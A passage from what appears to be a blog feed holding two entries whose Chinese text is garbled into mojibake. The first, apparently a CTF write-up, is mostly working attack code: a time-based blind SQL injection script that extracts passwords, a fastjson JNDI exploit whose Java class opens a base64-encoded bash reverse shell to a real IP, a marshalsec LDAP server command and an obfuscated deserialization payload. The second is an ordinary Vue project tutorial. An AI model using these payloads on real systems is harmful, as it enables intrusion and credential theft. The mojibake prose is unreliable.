p1=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># p2=&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#x27;user&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;.format(i,mid)</span></span><br><span class="line">        p1=<span class="string">&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))=&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        p2=<span class="string">&quot;admin&#x27;/**/and/**/if(ascii(substr((select/**/group_concat(password)/**/from/**/user),&#123;&#125;,1))&gt;&#123;&#125;,1,0)/**/and/**/(SELECT/**/count(*)/**/FROM/**/information_schema.tables/**/A,/**/information_schema.tables/**/B,information_schema.tables/**/C)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        data1=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p1&#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:p2&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.post(url,data=data1,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url,data=data2,timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å¯†ç ï¼Œå¾—åˆ°ä¸Šå»ä¹‹åå¯ä»¥åˆ›å»ºç”¨æˆ·ï¼š</p>
<p>å‘ç°æºç ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æäº¤jsonæ•°æ®</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> jsonStr = &#123; <span class="string">&quot;name&quot;</span> : $(<span class="string">&#x27;#se1&#x27;</span>).val() &#125;;</span><br><span class="line"></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        <span class="comment">//å‡ ä¸ªå‚æ•°éœ€è¦æ³¨æ„ä¸€ä¸‹</span></span><br><span class="line">        type: <span class="string">&quot;POST&quot;</span>,<span class="comment">//æ–¹æ³•ç±»å‹</span></span><br><span class="line">        dataType:<span class="string">&quot;text&quot;</span>,</span><br><span class="line">        contentType: <span class="string">&quot;application/x-www-form-urlencoded;charset=utf-8&quot;</span>,<span class="comment">//é¢„æœŸæœåŠ¡å™¨è¿”å›çš„æ•°æ®ç±»å‹</span></span><br><span class="line">        url: <span class="string">&quot;/create&quot;</span> ,<span class="comment">//url</span></span><br><span class="line">        data:&#123;<span class="string">&quot;roleJson&quot;</span>:<span class="built_in">JSON</span>.stringify(jsonStr)&#125;,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">            resObj = <span class="built_in">eval</span>(<span class="string">&quot;(&quot;</span>+result+<span class="string">&quot;)&quot;</span>);</span><br><span class="line">            $(<span class="string">&quot;#roleText&quot;</span>).html(<span class="string">&quot;&lt;span&gt;&quot;</span>+resObj.hello+<span class="string">&quot;&lt;/span&gt;&quot;</span>);</span><br><span class="line">            $(<span class="string">&quot;#roleImg&quot;</span>).html(<span class="string">&#x27;&lt;img style=&quot;width:180px;height:180px&quot; src=&quot;/searchimage?img=&#x27;</span>+resObj.number +<span class="string">&#x27;.png&quot;/&gt;&#x27;</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        error : <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;è¿è¡Œå¼‚å¸¸&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å°è¯•è¯»å–æ–‡ä»¶ï¼š</p>
<p><img src="image-20210322210650146.png" alt="image-20210322210650146"></p>
<p>javaçš„é¢˜ç›®ï¼Œå¤šåŠæ˜¯fastjsonå‡ºé—®é¢˜äº†ï¼Œçœ‹ä¸‹ç‰ˆæœ¬</p>
<h1 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h1><p>èµ·æœåŠ¡è¿™é‡Œå†™ç»™è‡ªå·±ç”¨äºè®°å½•ï¼Œå…´è®¸åˆ«äººç¬¬ä¸€æ¬¡ä¹Ÿä¼šç”¨å¾—åˆ°ï¼Œé¦–å…ˆåœ¨æ–°å»ºä¸€ä¸ªExploit.java ,ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(</span><br><span class="line">                    <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzgxLjY5LjIwMS42NS84MDAxIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac Exploit.java</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ–‡ä»¶Exploit.class,åœ¨å½“å‰æ–‡ä»¶ä¸‹è¾“å…¥æŒ‡ä»¤ï¼Œ</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m http.server 8002</span><br></pre></td></tr></table></figure>

<p>æˆåŠŸä¹‹ååº”è¯¥åƒè¿™æ ·ï¼š</p>
<p><img src="image-20210325144632955.png" alt="image-20210325144632955"></p>
<p>å†ä¹‹åä¸‹è½½marshalsec-masterï¼Œå®‰è£…å®Œæˆä¹‹åå»targetç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://81.69.201.65:8002/#Exploit</span><br></pre></td></tr></table></figure>

<p><img src="image-20210325144737080.png" alt="image-20210325144737080"></p>
<p>å†ä¹‹åæ‰“payloadå°±å¥½ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:&#123;<span class="string">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;java.lang.Class&quot;</span>,<span class="string">&quot;val&quot;</span>:<span class="string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>&#125;,<span class="string">&quot;x&quot;</span>:&#123;<span class="string">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://81.69.201.65:1389/Exploit&quot;</span>,<span class="string">&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;</span>:<span class="keyword">true</span>&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>java</tag>
        <tag>sqlæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Vueæ€»ç»“</title>
    <url>/2020/10/25/Vue%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="Vue-part"><a href="#Vue-part" class="headerlink" title="Vue part"></a>Vue part</h1><p>æ€»ç»“äº†å‰ç«¯é¡¹ç›®çš„æ­å»ºï¼Œä»¥åŠè‡ªå·±åœ¨è¿™æ¬¡ä½œå“ä¸­å­¦åˆ°äº†ä»€ä¹ˆ</p>
<a id="more"></a>

<p>Vueæˆ‘è®¤ä¸ºå­¦ä¸‹æ¥å°±æ˜¯å¾ˆçˆ½ï¼ŒåŸºæœ¬ä¸Šä¸ç”¨å†å„ç§å»ç»‘å®šJSå½“ä¸­çš„domå…ƒç´ äº†ï¼ˆgetElementByIdä»€ä¹ˆçš„ï¼‰</p>
<p>å…¶ä¸­åŸºç¡€æºç ï¼Œæœ‰ä¸€ä¸ªindex.html</p>
<h2 id="1-index-html"><a href="#1-index-html" class="headerlink" title="1.index.html"></a>1.index.html</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;icon&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&lt;%= BASE_URL %&gt;favicon.ico&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">strong</span>&gt;</span>We&#x27;re sorry but <span class="tag">&lt;<span class="name">%=</span> <span class="attr">htmlWebpackPlugin.options.title</span> %&gt;</span> doesn&#x27;t work properly without JavaScript enabled. Please enable it to continue.<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- built files will be auto injected --&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨çš„æ—¶å€™æœ‰ä¸€ä¸ªmain.jsï¼ŒAPP.vueç­‰ç­‰ã€‚ç°åœ¨è®²ä¸€ä¸‹æˆ‘æ˜¯æ€ä¹ˆåšä¸‹æ¥çš„ï¼Œæˆ‘åˆ©ç”¨åˆ°çš„æ¡†æ¶æ˜¯antdvï¼Œå†package.jsonå½“ä¸­å¯ä»¥æ‰¾åˆ°</p>
<h2 id="2-package-json"><a href="#2-package-json" class="headerlink" title="2.package.json"></a>2.package.json</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;@antv/data-set&quot;: &quot;^0.11.7&quot;,</span><br><span class="line">    &quot;@antv/g2&quot;: &quot;^4.0.15&quot;,</span><br><span class="line">    &quot;@sven0706/websocket&quot;: &quot;^1.0.1&quot;,</span><br><span class="line">    &quot;ant-design-vue&quot;: &quot;^1.6.5&quot;,</span><br><span class="line">    &quot;axios&quot;: &quot;^0.20.0&quot;,</span><br><span class="line">    &quot;core-js&quot;: &quot;^3.6.5&quot;,</span><br><span class="line">    &quot;echarts&quot;: &quot;^4.9.0&quot;,</span><br><span class="line">    &quot;html2canvas&quot;: &quot;^1.0.0-rc.7&quot;,</span><br><span class="line">    &quot;js-cookie&quot;: &quot;^2.2.1&quot;,</span><br><span class="line">    &quot;jspdf&quot;: &quot;^2.1.1&quot;,</span><br><span class="line">    &quot;less&quot;: &quot;^3.12.2&quot;,</span><br><span class="line">    &quot;less-loader&quot;: &quot;^7.0.1&quot;,</span><br><span class="line">    &quot;rc-resize-observer&quot;: &quot;^0.2.5&quot;,</span><br><span class="line">    &quot;react&quot;: &quot;^16.13.1&quot;,</span><br><span class="line">    &quot;react-dom&quot;: &quot;^16.13.1&quot;,</span><br><span class="line">    &quot;react-window&quot;: &quot;^1.8.5&quot;,</span><br><span class="line">    &quot;vant&quot;: &quot;^2.10.9&quot;,</span><br><span class="line">    &quot;vue&quot;: &quot;^2.6.11&quot;,</span><br><span class="line">    &quot;vue-print-nb&quot;: &quot;^1.5.0&quot;,</span><br><span class="line">    &quot;vue-router&quot;: &quot;^3.4.5&quot;,</span><br><span class="line">    &quot;vuex&quot;: &quot;^3.5.1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;devDependencies&quot;: &#123;</span><br><span class="line">    &quot;@vue/cli-plugin-babel&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;@vue/cli-plugin-eslint&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;@vue/cli-service&quot;: &quot;~4.5.0&quot;,</span><br><span class="line">    &quot;babel-eslint&quot;: &quot;^10.1.0&quot;,</span><br><span class="line">    &quot;eslint&quot;: &quot;^6.7.2&quot;,</span><br><span class="line">    &quot;eslint-plugin-vue&quot;: &quot;^6.2.2&quot;,</span><br><span class="line">    &quot;vue-template-compiler&quot;: &quot;^2.6.11&quot;</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure>

<p>è¦ç”¨çš„æ—¶å€™å†é¡¹ç›®æ ¹ç›®å½•ä¸‹cnpm -iå³å¯ã€‚</p>
<p>è®²ä¸€ä¸‹è·¯ç”±è¯¥æ€ä¹ˆåšæŠŠï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ª</p>
<h2 id="3-router-js"><a href="#3-router-js" class="headerlink" title="3.router.js"></a>3.router.js</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¼•å…¥vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="comment">//å¼•å…¥vue-router</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>åœ¨Vueå½“ä¸­ï¼Œæ‰€æœ‰éœ€è¦å¼•ç”¨çš„ä¸œè¥¿éœ€è¦ç”¨Vue.useä¹‹åæ‰ä¼šç”Ÿæ•ˆ</p>
<p>æ•…æˆ‘ä»¬æ„é€ ä¹‹åçš„ä»£ç æ¡†æ¶å¤§è‡´å¦‚ä¸‹ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å¼•å…¥vue</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span>;</span><br><span class="line"><span class="comment">//å¼•å…¥vue-router</span></span><br><span class="line"><span class="keyword">import</span> VueRouter <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¼•ç”¨page1é¡µé¢</span></span><br><span class="line"><span class="keyword">import</span> upload  <span class="keyword">from</span> <span class="string">&#x27;./components/upload.vue&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> login <span class="keyword">from</span> <span class="string">&#x27;./components/login.vue&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰routesè·¯ç”±çš„é›†åˆï¼Œæ•°ç»„ç±»å‹</span></span><br><span class="line"><span class="keyword">const</span> routes=[</span><br><span class="line">    <span class="comment">//å•ä¸ªè·¯ç”±å‡ä¸ºå¯¹è±¡ç±»å‹ï¼Œpathä»£è¡¨çš„æ˜¯è·¯å¾„ï¼Œcomponentä»£è¡¨ç»„ä»¶</span></span><br><span class="line">    &#123;<span class="attr">path</span>:<span class="string">&#x27;/upload&#x27;</span>,<span class="attr">component</span>:upload&#125;,</span><br><span class="line">    &#123;<span class="attr">path</span>:<span class="string">&#x27;/login&#x27;</span>,<span class="attr">component</span>:login&#125;,</span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªVueæ–‡ä»¶çš„æ ¼å¼å¦‚ä¸‹ï¼š</p>
<h2 id="4-ä¸»å…¥å£"><a href="#4-ä¸»å…¥å£" class="headerlink" title="4.ä¸»å…¥å£"></a>4.ä¸»å…¥å£</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;app&quot;&gt; </span><br><span class="line">      &lt;router-view&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  name: &#39;App&#39;,</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨templateå½“ä¸­æ„é€ HTMLçš„ä»£ç ï¼Œscriptå½“ä¸­æ„é€ å½“å‰é¡µé¢çš„JSï¼Œè€Œstyleè®¾ç½®ä¸­å†™cssã€‚å¦‚æœä¸åšé™å®šï¼ŒCSSå°†ä¼šæ˜¯å…¨å±€ç”Ÿæ•ˆçš„ï¼</p>
<p>è€ŒAPPä½œä¸ºä¸»é¡µé¢ï¼Œåªéœ€è¦å†™ä¸€å¥è¯å³å¯ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-view</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€å¥è¯çš„æ„æ€ä»£ç å°†é¡µé¢å†…å®¹æ‰˜ç®¡ç»™Vueï¼Œæ ¹æ®vueçš„Routeræ¥æ˜¾ç¤ºå†…å®¹ </p>
<p>è€ŒRouterçš„è®¾ç½®åœ¨main.jså½“ä¸­ï¼ˆå®é™…ä¸Šï¼Œå‡ ä¹æ‰€æœ‰çš„è®¾ç½®éƒ½æ”¾åœ¨main.jså½“ä¸­è¿›è¡Œç»Ÿä¸€è®¾ç½®ï¼‰</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  render: <span class="function"><span class="params">h</span> =&gt;</span> h(App),</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>åœ¨main.jså¯¼å…¥çš„æ¨¡å—å¯ä»¥å…¨é¡¹ç›®ç”Ÿæ•ˆï¼Œå¦‚æœæƒ³è¦æ™®é€šçš„ç”Ÿæ•ˆä¸€ä¸ªæ¨¡å—ï¼Œè¿™æ ·æ„é€ ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Button, Table, Menu, Switch,Icon,Layout,Upload,Breadcrumb,FormModel,Input,Divider,message,Form,Alert,Spin,Modal  &#125; <span class="keyword">from</span> <span class="string">&#x27;ant-design-vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨ä¸‹é¢ï¼š</span></span><br><span class="line">Vue.use(Modal)</span><br><span class="line">Vue.use(Spin)</span><br><span class="line">Vue.use(Alert)</span><br><span class="line">Vue.use(Form)</span><br><span class="line">Vue.use(axios)</span><br><span class="line">Vue.use(htmlToPdf)</span><br><span class="line">Vue.use(Divider)</span><br><span class="line">Vue.use(Input)</span><br><span class="line">Vue.use(FormModel)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³è¦ä¿®æ”¹Vueé»˜è®¤çš„è®¾ç½®ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯¼å…¥axiosçš„æ—¶å€™è¿™æ ·æ„é€ ï¼š</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line">Vue.prototype.$http = axios</span><br></pre></td></tr></table></figure>

<p>ä¹‹åæˆ‘æ„é€ äº†ä¸€ä¸ªå…¬å…±ä½¿ç”¨çš„Vueæ¨¡æ¿ï¼Œä¹Ÿå°±æ˜¯èœå•æ çš„æ’ä»¶ï¼Œæˆ‘æ˜¯åˆ›å»ºäº†ä¸€ä¸ªcommonsæ–‡ä»¶å¤¹ï¼Œå¹¶å†™åœ¨é‡Œé¢</p>
<h2 id="5-æ’æ§½"><a href="#5-æ’æ§½" class="headerlink" title="5.æ’æ§½"></a>5.æ’æ§½</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a-layout</span> <span class="attr">id</span>=<span class="string">&quot;components-layout-demo-side&quot;</span> <span class="attr">style</span>=<span class="string">&quot;min-height: 100vh&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a-layout-sider</span> <span class="attr">v-model</span>=<span class="string">&quot;collapsed&quot;</span> <span class="attr">width</span>=<span class="string">&quot;12%&quot;</span> <span class="attr">collapsible</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;logo&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a-menu</span> <span class="attr">theme</span>=<span class="string">&quot;dark&quot;</span> <span class="attr">:default-selected-keys</span>=<span class="string">&quot;[&#x27;1&#x27;]&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;inline&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;upload&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;cloud-download&quot;</span> /&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                  æ–‡ä»¶ä¸Šä¼   </span><br><span class="line">              <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-sub-menu</span> <span class="attr">key</span>=<span class="string">&quot;sub1&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;area-chart&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">                  æ•°æ®åˆ†æ</span><br><span class="line">                <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;report&quot;</span>&gt;</span></span><br><span class="line">              æ—¥å¿—åˆ†æ</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;getpdf&quot;</span>&gt;</span></span><br><span class="line">              è·å–æŠ¥å‘Š</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-sub-menu</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-sub-menu</span> <span class="attr">key</span>=<span class="string">&quot;sub2&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">slot</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a-icon</span> <span class="attr">type</span>=<span class="string">&quot;dashboard&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>ç«‹ä½“æ•°æ®<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;attackaddress&quot;</span>&gt;</span></span><br><span class="line">              æ”»å‡»æº¯æº</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a-menu-item</span> <span class="attr">key</span>=<span class="string">&quot;8&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;watchlog&quot;</span>&gt;</span></span><br><span class="line">            å®æ—¶ç›‘æ§</span><br><span class="line">            <span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a-menu-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">a-sub-menu</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a-menu-item</span> <span 